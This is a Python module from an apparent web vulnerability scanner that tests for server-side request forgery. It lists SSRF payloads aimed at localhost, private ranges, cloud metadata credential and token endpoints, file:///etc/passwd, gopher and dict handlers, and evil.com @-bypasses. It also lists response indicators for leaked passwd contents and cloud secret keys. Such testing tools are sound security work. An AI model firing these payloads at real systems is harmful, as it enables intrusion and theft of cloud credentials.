"""
SSRF (Server-Side Request Forgery) Vulnerability Tester
"""

import json
from typing import List, Dict
from .base_tester import BaseVulnerabilityTester


class SSRFTester(BaseVulnerabilityTester):
    """Tests for SSRF vulnerabilities"""
    
    def get_payloads(self) -> List[str]:
        """Get SSRF payloads"""
        return [
            # Internal IP addresses
            'http://127.0.0.1',
            'http://127.0.0.1:80',
            'http://127.0.0.1:22',
            'http://127.0.0.1:3306',
            'http://localhost',
            'http://localhost:80',
            'http://0.0.0.0',
            'http://[::1]',
            'http://[::1]:80',
            
            # Private IP ranges
            'http://192.168.0.1',
            'http://192.168.1.1',
            'http://10.0.0.1',
            'http://172.16.0.1',
            
            # Cloud metadata endpoints
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            
            # DNS rebinding
            'http://spoofed.burpcollaborator.net',
            'http://localtest.me',
            
            # File protocol
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'file://localhost/etc/passwd',
            
            # URL encoding bypasses
            'http://127.1',
            'http://127.000.000.1',
            'http://2130706433',  # Decimal IP
            'http://0x7f.0x0.0x0.0x1',  # Hex IP
            
            # @ symbol bypass
            'http://evil.com@127.0.0.1',
            'http://127.0.0.1@evil.com',
            
            # CRLF injection
            'http://127.0.0.1%0d%0aContent-Length:%200%0d%0a%0d%0a',
            
            # Protocol handlers
            'gopher://127.0.0.1',
            'dict://127.0.0.1:11211',
            'sftp://127.0.0.1',
            'tftp://127.0.0.1',
            
            # URL with credentials
            'http://admin:admin@127.0.0.1',
            
            # localhost variations
            'http://127.1.1.1',
            'http://127.127.127.127',
        ]
    
    def check_vulnerability(self, response, baseline, payload) -> bool:
        """Check if response indicates SSRF vulnerability"""
        if not response or not baseline:
            return False
        
        response_text = response.text.lower()
        
        # Check for internal network responses
        ssrf_indicators = [
            # Linux/Unix
            'root:x:0:0',
            '/etc/passwd',
            '/bin/bash',
            '/usr/bin',
            
            # Windows
            '[extensions]',
            'win.ini',
            'c:\\windows',
            
            # Cloud metadata
            'ami-id',
            'instance-id',
            'security-credentials',
            'accesskeyid',
            'secretaccesskey',
            'metadata',
            
            # Network errors that confirm connection attempt
            'connection refused',
            'connection timed out',
            'no route to host',
            'network is unreachable',
            
            # Success indicators
            'internal server',
            'private network',
            'localhost',
            
            # Database responses
            'mysql',
            'postgresql',
            'redis',
            'mongodb'
        ]
        
        for indicator in ssrf_indicators:
            if indicator in response_text:
                return True
        
        # Check for significant response difference
        if self._response_differs_significantly(response, baseline):
            # Additional validation for SSRF
            if response.status_code in [200, 301, 302, 500, 503]:
                return True
        
        # Check for timing-based SSRF
        if hasattr(response, 'elapsed'):
            response_time = response.elapsed.total_seconds()
            if response_time > 10:  # Unusually long response time
                return True
        
        return False
    
    def get_vulnerability_info(self) -> Dict[str, str]:
        """Return SSRF vulnerability information"""
        return {
            'name': 'Server-Side Request Forgery (SSRF)',
            'severity': 'critical',
            'description': 'The application is vulnerable to SSRF, which allows an attacker to make requests from the server to internal or external resources.',
            'cwe': 'CWE-918',
            'owasp': 'A10:2021 - Server-Side Request Forgery',
            'impact': 'Attackers can access internal services, read cloud metadata, scan internal networks, or perform port scanning.',
            'remediation': 'Implement strict input validation, use allowlists for allowed domains, disable unused protocols, and validate URLs before making requests.'
        }
